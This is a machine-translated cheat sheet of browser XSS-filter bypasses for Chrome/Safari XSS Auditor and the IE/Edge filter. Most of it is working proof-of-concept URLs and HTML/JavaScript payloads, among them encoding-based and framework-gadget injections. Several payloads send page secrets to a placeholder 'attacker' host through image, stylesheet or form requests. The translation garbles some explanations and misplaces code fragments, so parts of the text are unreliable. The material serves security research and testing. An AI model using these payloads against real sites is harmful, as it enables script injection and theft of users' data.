# Browser's XSS Filter Bypass Cheat Sheet

- **Translated by:** [*Dr. Google*](https://translate.google.com)<br>
- **Edited by:** [*Mr. Misconception*](https://github.com/MisconceivedSec)<br>
- **Translation [Link](https://github-com.translate.goog/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp)**<br>
- **Original [File](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)**<br>
- [**Archived Bypasses**](./Fixed_Bypass_Archive.md)
---

This page summarises XSS Auditor and XSS filter bypass. Content that runs on the latest versions of Chrome/Safari and IE11/Edge is eligible. If you're a vulnerability diagnostician, let us help you convincingly prove that an attack is possible, and if you're a security researcher, help us find more bypasses. What I'm listing is what can be bypassed in common situations. Just because a method isn't listed here doesn't mean it can't be abused in real-world situations. Regardless of whether it can be bypassed or not, it's always a good idea to do some underlying XSS mitigation.

---

# Table of contents

- XSS Auditor
    - Items not subject to blocking
        - XSS happening in string literals
        - XSS established by URL alone (such as when the input value is directly entered in the href part of the a tag)
        - If you have 2 or more injection points
        - If you have string operations
            - When deleted
            - When replaced
        - DOM based XSS other than document.write() the request string
        - XSS in XML pages
        - http(s): create link
        - Tags that can send requests to the outside
        - Arbitrary CSS description
    - bypass
        - Using the SVG animation values ​​attribute (Safari only)
        - Using multiple null characters (Safari only)
        - Using comments with --> in script tags (Safari only)
        - Using half-baked base tags (Safari only)
            - Use of Flash
            - Using scripts loaded with relative URLs
        - Use of ISO-2022-JP escape sequences
        - Use of resources in the same domain
            - Case with XSS in path (Chrome only)
            - File upload function
            - Using Flash and flashvars
            - Using Flash's ExternalInterface.objectID and ExternalInterface.call()
            - Using Angular
            - Using Vue.js
            - Using jQuery
            - Using underscore.js
            - Using JSX transformation scripts such as JSXTransformer/babel-standalone
        - Use odd tags when document.write() (Chrome only)
        - Using half-baked form tags (getting information only) (Safari only)
    - past bypass
- XSS filter for IE/Edge
    - Items not subject to blocking
        - XSS happening in string literals
        - All DOM based XSS
        - XSS with 2 or more injection points on one page
        - If you have string operations
            - When deleted
            - When replaced
        - Tags that can send requests to the outside
        - Using strings disguised as XML namespaces (Edge only)
        - Using HZ-GB-2312 Escape Sequences
        - Using encoding behavior when navigating
        - Using the Adobe Acrobat Reader plug-in (IE only)
        - Using Content Sniffing for XML (IE only)
        - Use UTF-7 BOM (IE only)
        - Using \<?PXML\> (IE only)
        - Use of referrer
            - Use of link functions within the same domain (including subdomains)
            - Bypass where arbitrary URL can be specified
            - If the state before submission to the vulnerable form can be maintained on the page
            - Using option tags
            - Using an empty iframe
        - Use of character-referenced strings in style (style description only)
    - past bypass

# XSS Auditor

## Items not subject to blocking

In contexts where protection is not provided in the first place, scripts can be executed without special manipulation.

### XSS happening in string literals

https://vulnerabledoma.in/bypass/str_literal?q=%22%3Balert(1)//

```html
<script>var q="";alert(1)//"</script>
```

### XSS established by URL alone (such as when the input value is directly entered in the href part of the a tag)

https://vulnerabledoma.in/bypass/link?q=javascript:alert(1)

```html
<a href="javascript:alert(1)">Link</a>
```

### If you have 2 or more injection points

(It seems to be able to block a considerable number of cases that occur with two or more, but since the case reported in the past ( [#96616](https://bugs.chromium.org/p/chromium/issues/detail?id%3D96616) [#403636](https://bugs.chromium.org/p/chromium/issues/detail?id%3D403636) ) was WontFixed, it is classified as the one that is not targeted for blocking.)

https://vulnerabledoma.in/bypass/text?type=2&q=%60-alert(1)%3C/script%3E%3Cscript%3E%60

```html
<div>`-alert(1)</script><script>`</div>
<div>`-alert(1)</script><script>`</div>
```

### If you have string operations

When some strings are removed or replaced, intervening strings do not block.

#### When deleted

https://vulnerabledoma.in/bypass/text?type=6&q=%3Csvg%20o%3Cscript%3Enload=alert(1)%3E

```html
<svg o<script>nload=alert(1)>
↓
<svg onload=alert(1)>
```

#### When replaced

https://vulnerabledoma.in/bypass/text?type=7&q=%3Cscript%3E/%26/-alert(1)%3C/script%3E

```html
<script>/&/-alert(1)</script>
↓
<script>/&amp;/-alert(1)</script>
```

### DOM based XSS other than request string

https://vulnerabledoma.in/bypass/dom_innerhtml#%3Cimg%20src=x%20onerror=alert(1)%3E

```html
<body>
<script>
hash=location.hash.slice(1);
document.body.innerHTML=decodeURIComponent(hash);
</script>
</body>
```

https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(1)

```html
<script>
location.href=decodeURIComponent(location.hash.slice(1));
</script>
```

### XSS in XML pages

https://vulnerabledoma.in/bypass/xml?q=%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E

```xml
<?xml version="1.0"?><html><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script></html>
```

Bypass also occurs when a character string can be written from the top of the page, `Content-Type`is not specified correctly, and XML is selected by Content Sniffing.

https://vulnerabledoma.in/bypass/text?mime=unknown&q=%3C?xml%20version=%221.0%22?%3E%3Cscript%20xmlns=%22http://www.w3.org/1999/xhtml%22%3Ealert(1)%3C/script%3E

```xml
<?xml version="1.0"?><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
```

Anything less than this does not lead to script execution, but is allowed to be written and has the potential to be used for attacks to some extent.

### http(s): create link

https://vulnerabledoma.in/bypass/text?q=%3Ca%20href=https://attacker/%3ESession%20expired.%20Please%20login%20again.%3C/a%3E

```html
<a href=https://attacker/>Session expired. Please login again.</a>
```

### Tags that can send requests to the outside

It is sometimes possible to include confidential information in requests such as images, for example by using open quotes.

https://vulnerabledoma.in/bypass/text?type=8&q=%3Cimg%20src=%22https://attacker/?data=

```html
<p><img src="https://attacker/?data=</p>
<p>This is a secret text.</p>
<p id="x">AAA</p>
```

### Arbitrary CSS description

In addition to disguising the appearance of the page, if the same page contains sensitive information, it may be possible to retrieve the information using only CSS. See URL for details.

Reference URL:

- http://www.businessinfo.co.uk/labs/talk/The_Sexy_Assassin.ppt
- https://masatokinugawa.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html

https://vulnerabledoma.in/bypass/text?q=%3Cstyle%3E@import%20%27//attacker/test.css%27%3C/style%3E

```html
<style>@import '//attacker/test.css'</style>
```

https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=stylesheet%20href=//attacker/test.css%3E

```html
<link rel=stylesheet href=//attacker/test.css>
```

## bypass

### Using the SVG animation values ​​attribute (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=709365
- https://bugs.chromium.org/p/chromium/issues/detail?id=738017

PoCs:

https://vulnerabledoma.in/bypass/text?q=%3Csvg%20xmlns:xlink=http://www.w3.org/1999/xlink%3E%3Canimate%20xlink:href=%23x%20attributeName=%22xlink:href%22%20values=%22%26%23x3000%3Bjavascript:alert(1)%22%20/%3E%3Ca%20id=x%3E%3Crect%20width=100%20height=100%20/%3E%3C/a%3E

```html
<svg xmlns:xlink=http://www.w3.org/1999/xlink><animate xlink:href=#x attributeName="xlink:href" values="&#x3000;javascript:alert(1)" /><a id=x><rect width=100 height=100 /></a>
```

### Using multiple null characters (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. a null byte is printed
3. no preceding whitespace

Reference URL:

- https://twitter.com/0rbz_/status/896896095862669312]

PoCs:

https://vulnerabledoma.in/bypass/text?q=%00%00%00%00%00%00%00%3Cscript%3Ealert(1)%3C/script%3E

```html
[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
```

### `-->` Using comments within script tags (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is a closing tag of the script tag without a line break after it

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=753307

PoCs:

https://vulnerabledoma.in/bypass/text?type=9&q=%3Cscript%3Ealert(1)%0A--%3E

```html
<div><script>alert(1)
--></div><script src=/test.js></script>
```

### Using half-baked base tags (Safari only)

#### Use of Flash

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. immediately followed by whitespace or `'"`after
3. Flash can be used in the target environment

Reference URL:

- https://masatokinugawa.l0.cm/2016/05/xss8.html

PoCs:

(if there is no space immediately after):
https://vulnerabledoma.in/bypass/text?type=3&q=%3Cembed%20allowscriptaccess=always%20src=/xss.swf%3E%3Cbase%20href=//l0.cm/

```html
<div><embed allowscriptaccess=always src=/xss.swf><base href=//l0.cm/</div>
```

(If there is a white space immediately after):
https://vulnerabledoma.in/bypass/text?type=4&q=%3Cembed%20allowscriptaccess=always%20src=/xss.swf%3E%3Cbase%20href=%22//l0.cm/

```html
<div> <embed allowscriptaccess=always src=/xss.swf><base href="//l0.cm/ </div><div id="x"></div>
```

#### Using scripts loaded with relative URLs

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. immediately followed by whitespace or `'"`after
3. After that there is a part that loads the script with a relative URL

PoCs:

https://vulnerabledoma.in/bypass/text?type=9&q=%3Cbase%20href=//cors.l0.cm/

```html
<div><base href=//cors.l0.cm/</div><script src=/test.js></script>
```

### Use of ISO-2022-JP escape sequences

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is no character code specified on the page

supplement:

In ISO-2022-JP HTML, byte sequences such as `[0x1B](B`, `[0x1B](H`, `[0x1B](J`are ignored. You can bypass this by putting it between react strings. Also, in Chrome/Safari, `[0x1B]$@[0x0A]`byte strings such as `[0x0A]`are treated in the same way as, but the XSS Auditor cannot interpret them well and causes a bypass.

Reference URL:

- https://bugs.chromium.org/p/chromium/issues/detail?id=114941
- https://l0.cm/encodings/test3/

PoCs:

- https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Bnload=alert(1)%3E
- https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Hnload=alert(1)%3E
- https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Csvg%20o%1B(Jnload=alert(1)%3E
```html
<meta charset=iso-2022-jp><svg o[0x1B](Bnload=alert(1)>
```

(*Because the $ sign is arbitrarily encoded and does not work as intended, the redirect is sandwiched by a method that includes a $.)

- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$@%0A%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$@%0A%3C/script%3E)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$B%0A%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$B%0A%3C/script%3E)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B(I%0A%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B\(I%0A%3C/script%3E)
- [https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$@%0D%3C/script%3E](https://vulnerabledoma.in/bypass/text?q=%3Cmeta%20charset=iso-2022-jp%3E%3Cscript%3Ealert(1)%1B$@%0D%3C/script%3E)

```html
<meta charset=iso-2022-jp><script>alert(1)[0x1B]$@[0x0A]</script>
```

### Use of resources in the same domain

XSS Auditor does not block loading same-domain resources that do not have queries. Bypassing is possible in some cases if the resources necessary for an attack can be placed in the same domain.

#### Case with XSS in path (Chrome only)

Conditions for attacking:

1. XSS that can write arbitrary tags is in the path
2. Doesn't require a query to display the page

PoCs:

https://vulnerabledoma.in/bypass/path/%3Clink%20rel=import%20href=%22%2Fbypass%2Fpath%2F%3Cscript%3Ealert(1)%3C%2Fscript%3E%22%3E

```html
PATH_INFO:/<link rel=import href="/bypass/path/<script>alert(1)</script>">
```

#### File upload function

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Hosting user-uploaded files on the same origin

PoCs:

https://vulnerabledoma.in/bypass/text?q=%3Cscript%20src=/bypass/usercontent/xss.js%3E%3C/script%3E

```html
<script src=/bypass/usercontent/xss.js></script>
```

(Chrome only) 

https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/usercontent/icon.jpg%3E

```html
<link rel=import href=/bypass/usercontent/icon.jpg>
```

#### `flashvars` Use with Flash

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. `ExnternalInterface.call()`There is Flash passing the parameter string unescaped to the same origin
3. Flash can be used in the target environment

supplement:

`flashvars`Attributes let you pass parameters without having to provide Flash parameters directly in the query. (= On the Flash side, even if passing parameters from the URL is restricted as a countermeasure against XSS by opening Flash directly, it can be passed.) In addition, when there is a CSP `flashvars`such `Content-Security-Policy: default-src 'self'`as also available.

PoCs:

https://vulnerabledoma.in/bypass/text?csp=self&q=%3Cembed%20name=a%20flashvars=%27autoplay=true%26file=%22})%22)-(alert=alert(1)))}catch(e){}//%27%20allowscriptaccess=always%20src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf%3E

```html
<embed name=a flashvars='autoplay=true&file="})\")-(alert=alert(1)))}catch(e){}//' allowscriptaccess=always src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf>
```

ActionScript:

```actionscript
ExternalInterface.call("setTimeout", ExternalInterface.objectID + '_event' + "('" + eventName + "'," + eventValues + ")", 0);
```

#### Use with `ExternalInterface.objectID` Flash `ExternalInterface.call()`

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. There is Flash being passed to `ExternalInterface.objectID`the same origin`ExternalInterface.call()`
3. Flash can be used in the target environment

supplement:

`ExternalInterface.objectID`is a property in which the value of the name attribute of the tag used for embedding is set, and although it cannot be XSSed by itself, it can be used only for bypassing. It can also `Content-Security-Policy: default-src 'self'`be used to bypass CSP when there are restrictions on CSP such as.

PoCs:

https://vulnerabledoma.in/bypass/text?csp=self&q=%3Cembed%20name=%27alert(1)-%27%20allowscriptaccess=always%20src=//vulnerabledoma.in/bypass/wp-includes/js/ mediaelement/flashmediaelement.swf%3E

```html
<embed name='alert(1)-' allowscriptaccess=always src=//vulnerabledoma.in/bypass/wp-includes/js/mediaelement/flashmediaelement.swf>
```

ActionScript:

```actionscript
ExternalInterface.call(ExternalInterface.objectID + '_init');
```

#### Using Angular

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. A page on the same origin that hosts Angular or loads Angular from a CORS-enabled CDN

supplement:

Angular will try to expand the template enclosed in {{}} inside the tag with the attribute ng-app. Templates can run scripts.

Reference URL:

- https://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html

PoCs:

https://vulnerabledoma.in/bypass/text?q=%3Cscript%20src=%22/js/angular1.6.4.min.js%22%3E%3C/script%3E%3Cp%20ng-app%3E{ {constructor.constructor(%27alert(1)%27)()}}

```html
<script src="/js/angular1.6.4.min.js"></script><p ng-app>{{constructor.constructor('alert(1)')()}}
```

If you have a page on the same origin that loads Angular from a CORS-enabled CDN, you can load resources from external origins by indirectly loading them from HTML Imports.

(Chrome only) 

https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=angular.html%3E%3Cp%20ng-app%3E{{constructor.constructor(%27alert(1 ) )%27)()}}

```html
<link rel=import href=angular.html><p ng-app>{{constructor.constructor('alert(1)')()}}
```

#### Using Vue.js

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. A page on the same origin that hosts Vue.js or loads from a CORS-enabled CDN
3. There is a script on the page or on the same origin that can perform template expansion for specially crafted tags

PoCs:

(This example is for Chrome only) 

https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/vue.html%3E%3Cdiv%20id=app%3E{{constructor. constructor(%27alert(1)%27)()}}

```html
<link rel=import href=/bypass/vue.html><div id=app>{{constructor.constructor('alert(1)')()}}
```

#### Using jQuery

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. A page on the same origin that hosts jQuery or loads jQuery from a CORS-enabled CDN
3. There is a script on the page or on the same origin that can execute jQuery additional functions for the crafted form tag

supplement:

Additional jQuery functions are , `after`, `before`, `prepend`, `append`, `html`, `replaceWith`, `wrap`, `wrapAll`, `insertBefore`, `insertAfter`, and so on `prependTo`. By using a form component with a name attribute, the reference destination of [Node.ownerDocument](https://developer.mozilla.org/ja/docs/Web/API/Node/ownerDocument) is misunderstood, and the script is executed when it should not be executed (this technique is known as DOM [Clobbering](https://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream/21)). [In addition, the fact that there is a process to remove](https://github.com/jquery/jquery/#L206) script blocks before execution , combined with the fact that Auditor does not block script blocks that contain only comments, causes the bypass.`appendTo` `ownerDocument` `<!--`

Reference URL:

- [https://sirdarckcat.github.io/csp/jquery.html](https://sirdarckcat.github.io/csp/jquery.html)

PoCs:

[https://vulnerabledoma.in/bypass/text?type=5&q=%3Cform%20class=child%3E%3Cinput%20name=ownerDocument%3E%3Cscript%3E%3C!--alert(1)%3C/script% 3E%3C/form%3E](https://vulnerabledoma.in/bypass/text?type%3D5%26q%3D%253Cform%2520class%3Dchild%253E%253Cinput%2520name%3DownerDocument%253E%253Cscript%253E%253C!--alert(1)%253C/script%253E%253C/form%253E)

```html
<!DOCTYPE html>
<html>
<head>
<script src="/js/jquery-3.2.1.min.js"></script>
<script>
$(document).ready(function(){
    // code taken from http://api.jquery.com/after/
    $( ".container" ).after( $( ".child" ) );
});
</script>
</head>
<body>
<!-- XSS -->
<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
<!-- XSS -->
<p class="container"></p>
</body>
<!-- Inspired by @sirdarckcat CSP bypass trick: https://sirdarckcat.github.io/csp/jquery.html -->
</html>
```

(This example is Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/jquery.html%3E%3Cp%20class=container%3E%3C/p %3E%3Cform%20class=child%3E%3Cinput%20name=ownerDocument%3E%3Cscript%3E%3C!--alert(1)%3C/script%3E%3C/form%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Clink%2520rel%3Dimport%2520href%3D/bypass/jquery.html%253E%253Cp%2520class%3Dcontainer%253E%253C/p%253E%253Cform%2520class%3Dchild%253E%253Cinput%2520name%3DownerDocument%253E%253Cscript%253E%253C!--alert(1)%253C/script%253E%253C/form%253E)

```html
<link rel=import href=/bypass/jquery.html><p class=container></p><form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
```

#### Using underscore.js

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Pages on the same origin that host underscore.js or load from a CORS-enabled CDN
3. A script exists on the page or on the same origin that can execute template expansion for a specially crafted script tag

PoCs:

(This example is for Chrome only) [https://vulnerabledoma.in/bypass/text?q=%3Clink%20rel=import%20href=/bypass/underscore.html%3E%3Cscript%20id=template%3E//%3C %alert`1`%\%3E\%3C\/script\%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Clink%2520rel%3Dimport%2520href%3D/bypass/underscore.html%253E%253Cscript%2520id%3Dtemplate%253E//%253C%25alert%25601%2560%25\%253E\%253C\/script\%253E)

```html
<link rel=import href=/bypass/underscore.html><script id=template>//<%alert`1`%></script>
```

#### Using JSX transformation scripts such as JSXTransformer/babel-standalone

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Pages on the same origin that host JSX transformation scripts such as JSXTransformer.js or load them from a CORS-enabled CDN

supplement:

Take advantage of the conversion script parsing SVG script blocks in the same way as HTML script blocks. The comment part enclosed by is evaluated as a script `<!--`because it is not actually executed .`-->`

PoCs:

(This example is for Chrome only) [https://vulnerabledoma.in/bypass/text?charset=utf-8&type=1&q=%3Clink%20rel=import%20href=/bypass/babel-standalone.html%3E%3Csvg%3E %3Cscript%20type=%22text/jsx%22%3E//%3C!--%0aalert(1)//--%3E%3C/svg%3E%3Cscript%3E0%3C/script%3E](https://vulnerabledoma.in/bypass/text?charset%3Dutf-8%26type%3D1%26q%3D%253Clink%2520rel%3Dimport%2520href%3D/bypass/babel-standalone.html%253E%253Csvg%253E%253Cscript%2520type%3D%2522text/jsx%2522%253E//%253C!--%250aalert(1)//--%253E%253C/svg%253E%253Cscript%253E0%253C/script%253E)

```html
<link rel=import href=/bypass/babel-standalone.html><svg><script type=text/jsx>//<!--
alert(1)//--></svg><script>0</script>
```

### `document.write()` Occasionally use half-baked tags (Chrome only)

Conditions for attacking:

1. `document.write()`There is XSS that renders the URL
2. The tag used for the attack `document.write()`can be closed outside (in the case of the PoC below, `</body>`is used as the closing tag)

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=421786](https://bugs.chromium.org/p/chromium/issues/detail?id%3D421786)

PoCs:

[https://vulnerabledoma.in/bypass/dom_docwrite#%3Cimg%20src=x%20onerror=alert(1)//](https://vulnerabledoma.in/bypass/dom_docwrite%23%253Cimg%2520src%3Dx%2520onerror%3Dalert(1)//)

```html
<body>
<script>
hash=location.hash.slice(1);
document.write(decodeURIComponent(hash));
</script>
</body>
```

### Using half-baked form tags (getting information only) (Safari only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. New form tags can be placed where existing form content containing sensitive information can be submitted

Reference URL:

- [https://bugs.chromium.org/p/chromium/issues/detail?id=719092](https://bugs.chromium.org/p/chromium/issues/detail?id%3D719092)

PoCs:

(if you are inside a form) [https://vulnerabledoma.in/bypass/form?q=%22%3E%3C/form%3E%3Cform%20action=https://attacker/](https://vulnerabledoma.in/bypass/form?q%3D%2522%253E%253C/form%253E%253Cform%2520action%3Dhttps://attacker/)

```html
<form action="form">
<input type="hidden" name="q" value=""></form><form action=https://attacker/">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

(when outside the form) [https://vulnerabledoma.in/bypass/form2?q=%3Cbutton%20form=f%3ECLICK%3Cform%20id=f%20action=https://attacker/](https://vulnerabledoma.in/bypass/form2?q%3D%253Cbutton%2520form%3Df%253ECLICK%253Cform%2520id%3Df%2520action%3Dhttps://attacker/)

```html
<div><button form=f>CLICK<form id=f action=https://attacker/</div>
<form action="form2">
<input type="hidden" name="secret" value="a09d3ef0">
</form>
```

# XSS filter for IE/Edge

## Items not subject to blocking

### XSS happening in string literals

supplement:

Previously there was a blocking condition for string literals. `location`Although it still partially remains, assignments to obviously attackable, which were previously blocked, are allowed, and there is almost no protection. It doesn't look like it's going to provide protection any more, so I've categorized it as non-blocking rather than bypass.

[https://vulnerabledoma.in/bypass/str_literal?q=%22%3Blocation='javascript\x3Aalert\x281\x29'//](https://vulnerabledoma.in/bypass/str_literal?q%3D%2522%253Blocation%3D%27javascript%255Cx3Aalert%255Cx281%255Cx29%27//)

```html
<script>var q="";location='javascript\x3Aalert\x281\x29'//"</script>
```

### All DOM based XSS

[https://vulnerabledoma.in/bypass/dom_docwrite#%3Cimg%20src=x%20onerror=alert(1)%3E](https://vulnerabledoma.in/bypass/dom_docwrite%23%253Cimg%2520src%3Dx%2520onerror%3Dalert(1)%253E)

```html
<script>
hash=location.hash.slice(1);
document.write(decodeURIComponent(hash));
</script>
```

[https://vulnerabledoma.in/bypass/dom_innerhtml#%3Cimg%20src=x%20onerror=alert(1)%3E](https://vulnerabledoma.in/bypass/dom_innerhtml%23%253Cimg%2520src%3Dx%2520onerror%3Dalert(1)%253E)

```html
<body>
<script>
hash=location.hash.slice(1);
document.body.innerHTML=decodeURIComponent(hash);
</script>
</body>
```

[https://vulnerabledoma.in/bypass/dom_redirect#javascript:alert(1)](https://vulnerabledoma.in/bypass/dom_redirect%23javascript:alert(1))

```html
<script>
location.href=decodeURIComponent(location.hash.slice(1));
</script>
```

### XSS with 2 or more injection points on one page

[https://vulnerabledoma.in/bypass/text?type=2&q=%22src=data:,alert%25281%2529%3E%3C/script%3E%3Cscript%20x=%22](https://vulnerabledoma.in/bypass/text?type%3D2%26q%3D%2522src%3Ddata:,alert%2525281%252529%253E%253C/script%253E%253Cscript%2520x%3D%2522)

```html
<div>"src=data:,alert%281%29></script><script x="</div>
<div>"src=data:,alert%281%29></script><script x="</div>

```

### If you have string operations

When some strings are removed or replaced, intervening strings do not block.

#### When deleted

[https://vulnerabledoma.in/bypass/text?type=6&q=%3Csvg%20o%3Cscript%3Enload=alert(1)%3E](https://vulnerabledoma.in/bypass/text?type%3D6%26q%3D%253Csvg%2520o%253Cscript%253Enload%3Dalert(1)%253E)

```html
<svg o<script>nload=alert(1)>
↓
<svg onload=alert(1)>
```

#### When replaced

`.`It will not be possible to block if the position expressed by the regular expression of the filter is replaced by more than the [determined width .](https://speakerdeck.com/masatokinugawa/shibuya-dot-xss-techtalk-number-9?slide%3D50)

We take advantage of the over-substitution behavior `<sc{r}ipt.*?>`to avoid matching the blocking condition that if is a wildcard of 0-3 characters, and is a wildcard of 0-5 characters, so the maximum width that can be cut off is 8 characters. The string length of the output after substitution is 10 characters, which exceeds the width of 8 characters and cannot be cut off.`&``/``&``/&amp;amp;`

PoCs:

[https://vulnerabledoma.in/bypass/text?type=10&q=%3Cscript/%26%3Ealert(1)%3C/script%3E](https://vulnerabledoma.in/bypass/text?type%3D10%26q%3D%253Cscript/%2526%253Ealert(1)%253C/script%253E)

```html
<script/&>alert(1)</script>
↓
<script/&amp;amp;>alert(1)</script>
```

Anything less than this does not lead to script execution, but is allowed to be written and has the potential to be used for attacks to some extent.

### Tags that can send requests to the outside

It is sometimes possible to include confidential information in requests such as images, for example by using open quotes.

[https://vulnerabledoma.in/bypass/text?type=8&q=%3Cimg%20src=%22https://attacker/?data=](https://vulnerabledoma.in/bypass/text?type%3D8%26q%3D%253Cimg%2520src%3D%2522https://attacker/?data%3D)

```html
<p><img src="https://attacker/?data=</p>
<p>This is a secret text.</p>
<p id="x">AAA</p>
```

## bypass

### Using strings disguised as XML namespaces (Edge only)

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. Flash is enabled in the target environment
3. `X-XSS-Protection:1; mode-block`does not have a header

supplement:

Edge will also try to block tags with an XML namespace. `<embed/:script`If such a string is used in normal HTML, it will be interpreted as a script tag instead of being interpreted as an embed tag, and blocking will fail. `X-XSS-Protection:1; mode-block`If the header is attached, the bypass will fail because the cut-off operation will have occurred .

Reference URL:

- [https://masatokinugawa.l0.cm/2016/12/xss9.html](https://masatokinugawa.l0.cm/2016/12/xss9.html)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%3Cembed/:script%20allowscriptaccess=always%20src=//l0.cm/xss.swf%3E](https://vulnerabledoma.in/bypass/text?q%3D%253Cembed/:script%2520allowscriptaccess%3Dalways%2520src%3D//l0.cm/xss.swf%253E)

```html
<embed/:script allowscriptaccess=always src=//l0.cm/xss.swf>
```

### Using HZ-GB-2312 Escape Sequences

Conditions for attacking:

1. There is XSS that can write arbitrary tags
2. `Content-Type`There is no character code specified in the header

Reference URL:

- [https://masatokinugawa.l0.cm/2015/09/xss7.html](https://masatokinugawa.l0.cm/2015/09/xss7.html)

PoCs:

[https://vulnerabledoma.in/bypass/text?q=%3Cx~%0Aonfocus=alert%281%29%20id=a%20tabindex=0%3E#a](https://vulnerabledoma.in/bypass/text?q%3D%253Cx~%250Aonfocus%3Dalert%25281%2529%2520id%3Da%2520tabindex%3D0%253E%23a)

```html
<x~
onfocus=alert(1) id=a tabindex=0>
```

### Using encoding behavior when navigating

Conditions for attacking:

1. Has reflective XSS via GET

supplement:

During navigation, IE/Edge encodes the query string with the character code of the page before navigation and sends the request. At this time, the XSS filter was (presumably) checking the encoded string itself, not the request being sent, which could cause a mismatch between the encoded string and the bytes actually sent. Bypass occurs when

A specific example is shown with the character code x-chinese-cns used in the PoC below. In x-chinese-cns `旡`the character is mapped to 0xA13E. `<script/旡`At this time, a query including this character string is sent from a page with x-chinese-cns set as the character code of the page, attached to a parameter with reflective XSS. Then, the sent request `旡`is not the UTF-8 representation, but the byte itself encoded with x-chinese-cns `</script/0xA1>`(0x3E ), and the tag is written `>`in the page . `<script>`Normally, `<script>`if you write a tag, the XSS filter should work, but it doesn't work here. It is speculated that the reason for this is that the filter mistakenly `<script/旡`saw the character string and `<sc{r}ipt.*?>`did not match the blocking condition.

Reference URL:

- [https://masatokinugawa.l0.cm/2017/05/xss14.html](https://masatokinugawa.l0.cm/2017/05/xss14.html)

PoCs:

- [https://l0.cm/bypass/ie_x-chinese-cns_text.html](https://l0.cm/bypass/ie_x-chinese-cns_text.html)

```html
<meta charset=utf-8>
<script>
  document.charset="x-chinese-cns";
  location="https://vulnerabledoma.in/bypass/text?q=<script/旡alert(1)<\/script/旡"
</script>
```

(For XSS only with attribute values) [https://l0.cm/bypass/ie_x-chinese-cns_attribute.html](https://l0.cm/bypass/ie_x-chinese-cns_attribute.html)

```html
<meta charset=utf-8>
<script>
  document.charset="x-chinese-cns";
  location="https://vulnerabledoma.in/bypass/attribute?q=乜onmouseover=alert(1)//"
</script>
```

As with other character codes, a mismatch between the encoded string and the bytes actually sent can be bypassed.

- [https://l0.cm/bypass/ie_hz_text.html](https://l0.cm/bypass/ie_hz_text.html)
- [https://l0.cm/bypass/ie_hz_attribute.html](https://l0.cm/bypass/ie_hz_attribute.html)
- [https://l0.cm/bypass/ie_iso2022jp_text.html](https://l0.cm/bypass/ie_iso2022jp_text.html)
- [https://l0.cm/bypass/ie_iso2022jp_attribute.html](https://l0.cm/bypass/ie_iso2022jp_attribute.html)

(The following is reproduced in an environment where the system locale is Japanese, but it was not reproduced in an environment with a German language. It seems that the operating principle is slightly different from other vectors, but I do not know the clear principle.For reference published in.)

- [https://l0.cm/bypass/ie_0xff_text.html](https://l0.cm/bypass/ie_0xff_text.html)
